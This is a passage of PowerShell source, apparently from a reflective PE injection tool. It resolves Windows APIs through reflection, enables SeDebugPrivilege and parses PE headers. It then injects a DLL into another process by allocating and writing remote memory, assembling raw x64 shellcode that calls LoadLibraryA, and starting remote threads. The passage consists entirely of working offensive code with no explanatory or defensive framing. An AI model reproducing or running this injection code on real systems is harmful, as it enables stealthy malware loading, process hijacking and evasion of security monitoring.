		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	

			
	
	
	

	
	
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw ""Cannot subtract bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw ""Cannot add bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw ""Cannot compare byte arrays of different size""
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = ""0x{0:X$($ValueSize)}"" -f [Int64]$Value 

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = ""EndAddress"", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = ""Size"", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq ""Size"")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw ""Trying to write to memory smaller than allocated address range. $DebugString""
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw ""Trying to write to memory greater than allocated address range. $DebugString""
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw ""Unable to get the handle to the current thread""
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw ""Unable to impersonate self""
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw ""Unable to OpenThreadToken.""
				}
			}
			else
			{
				Throw ""Unable to OpenThreadToken. Error code: $ErrorCode""
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, ""SeDebugPrivilege"", $PLuid)
		if ($Result -eq $false)
		{
			Throw ""Unable to call LookupPrivilegeValue""
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw ""Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError""
			}
		}
		
		else
		{
			
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error ""Error creating remote thread, thread handle is null"" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw ""Invalid IMAGE_NT_HEADER signature.""
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	
	
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw ""PE file is not an EXE or DLL""
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process""
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw ""Unable to write DLL path to remote process memory""
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""LoadLibraryA"") 
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process for the return value of LoadLibraryA""
			}
			
			
			
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
